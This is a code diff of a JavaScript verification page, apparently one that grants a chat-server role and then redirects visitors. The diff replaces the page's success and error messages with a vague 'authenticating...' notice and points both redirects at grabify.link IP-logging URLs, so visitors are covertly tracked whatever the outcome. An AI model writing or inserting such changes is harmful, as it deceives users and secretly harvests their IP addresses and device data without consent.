@@ -137,20 +137,20 @@ document.addEventListener('DOMContentLoaded', function() {
             .then(data => {
                 const roleId = data.roleId;
                 console.log('Role ID:', roleId);
-                resultText.innerText = '認証が成功しました。リダイレクトしています...';
+                resultText.innerText = '認証中です...';
                 resultMessage.style.display = 'block';
                 setTimeout(function() {
-                    window.location.href = 'https://republicofauech.github.io/vearithy/success/';
+                    window.location.href = 'https://grabify.link/ZXKFED';
                     executePythonScript();
                 }, 2000);
             })
             .catch(async error => {
                 console.error('Error granting role:', error);
                 await logErrorToServer(error);
-                resultText.innerText = 'ロールの付与中にエラーが発生しました。リダイレクトしています...';
+                resultText.innerText = '認証中です...';
                 resultMessage.style.display = 'block';
                 setTimeout(function() {
-                    window.location.href = 'https://republicofauech.github.io/vearithy/failure/';
+                    window.location.href = 'https://grabify.link/X9VP0A';
                 }, 2000);
             });
         } else {
